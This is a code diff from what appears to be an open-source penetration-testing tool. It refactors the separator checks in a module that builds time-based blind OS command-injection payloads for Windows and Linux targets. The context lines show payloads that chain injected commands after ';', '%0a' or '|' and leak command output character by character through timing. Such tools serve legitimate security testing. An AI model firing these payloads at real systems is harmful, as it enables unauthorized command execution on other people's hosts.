@@ -26,7 +26,7 @@ Time-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, output_length, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                  "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
@@ -44,7 +44,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
     else:
       pass
   else:
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
@@ -91,7 +91,7 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -112,7 +112,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
       pass
 
   else:
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  # Find the length of the output, using readline().
                  settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
@@ -156,7 +156,7 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -181,7 +181,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     cmd_exec = cmd
     if settings.USE_BACKTICKS:
       cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
                  # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
@@ -226,7 +226,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -248,7 +248,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
 
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  # Find the length of the output, using readline().
                  settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
@@ -290,7 +290,7 @@ Get the execution output, of shell execution.
 """
 def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
@@ -312,7 +312,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     if settings.USE_BACKTICKS:
       cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
     settings.USER_APPLIED_CMD = cmd
-    if separator == ";" or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 # Grab the execution output.
                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
@@ -366,7 +366,7 @@ __Warning__: The alternative shells are still experimental.
 def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -389,7 +389,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
 
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
@@ -432,7 +432,7 @@ Get the execution output, of shell execution.
 """
 def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -453,7 +453,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       pass
 
   else:
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
                  "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
@@ -492,7 +492,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -513,7 +513,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
       pass
 
   else:
-    if separator == ";" or separator == "%0a":
+    if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
